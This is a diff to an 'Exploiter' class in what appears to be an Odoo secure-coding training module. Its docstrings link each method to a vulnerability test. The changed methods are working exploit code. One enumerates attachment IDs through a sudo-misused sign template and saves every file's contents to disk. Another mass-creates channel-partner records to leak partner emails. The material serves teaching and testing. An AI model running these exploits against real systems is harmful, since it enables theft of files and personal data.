@@ -201,10 +201,11 @@ class Exploiter:
         Then, the definitions of each fields is available in the model class:
         safer_code/models/task.py
         """
+        task_id = self.rpc("safer_code.task", "search", [], limit=1)[0]
         self.rpc(
             "safer_code.task",
             "write",
-            [1],
+            [task_id],
             {
                 'name': None,
                 'description': None,
@@ -220,25 +221,27 @@ class Exploiter:
         test: safer_code/tests/test_leak_2_unsafe_sudo.py
         odoo-bin -d safer_db --test-tags .test_unsafe_related_sudo
         """
+        max_attachment_id = self.rpc("ir.attachment", "search", [], order="id DESC", limit=1)[0]
+        min_attachment_id = self.rpc("ir.attachment", "search", [], order="id ASC", limit=1)[0]
         template_id = self.rpc(
             "safer_code.sign.template",
             "create",
             {
-                "attachment_id": 1,
+                "attachment_id": min_attachment_id,
             },
         )
         download_folder = os.path.join(os.path.expanduser("~/Downloads"), "safer_code_results")
         os.makedirs(download_folder, exist_ok=True)
-        for attachment_id in range(1, 500):
+        for attachment_id in range(min_attachment_id, max_attachment_id):
             try:
                 self.rpc("safer_code.sign.template", "write", [template_id], {"attachment_id": attachment_id})
             except Exception:  # noqa: BLE001
                 continue
-            [result] = self.rpc("safer_code.sign.template", "read", [template_id], ["name", "datas"])
-            if not result["datas"]:
+            [result] = self.rpc("safer_code.sign.template", "read", [template_id], ["name", "raw"])
+            if not result["raw"]:
                 continue
             with open(os.path.join(download_folder, result["name"]), "wb") as f:
-                f.write(base64.b64decode(result["datas"]))
+                f.write(base64.b64decode(result["raw"]))
 
     @user("portal")
     def leak_rule_1(self):
@@ -247,12 +250,10 @@ class Exploiter:
         test: safer_code/tests/test_leak_3_master_the_rules.py
         odoo-bin -d safer_db --test-tags .test_unsafe_access_rights_channel_partner
         """
-        result = self.rpc("safer_code.mail.channel.partner", "search_read", [], ["partner_email"])
-        print(result)  # noqa: T201
-        for partner_id in range(30):
-            self.rpc("safer_code.mail.channel.partner", "create", {"partner_id": partner_id, "channel_id": 1})
-        result = self.rpc("safer_code.mail.channel.partner", "search_read", [], ["partner_email"])
-        print(result)  # noqa: T201
+        channel_id = self.rpc("safer_code.mail.channel", "search", [], limit=1)[0]
+        for partner_id in range(11, 30):
+            self.rpc("safer_code.mail.channel.partner", "create", {"partner_id": partner_id, "channel_id": channel_id})
+        print(self.rpc("safer_code.mail.channel.partner", "search_read", [], ["partner_email"]))  # noqa: T201
 
     @user("portal")
     def leak_password_1(self):
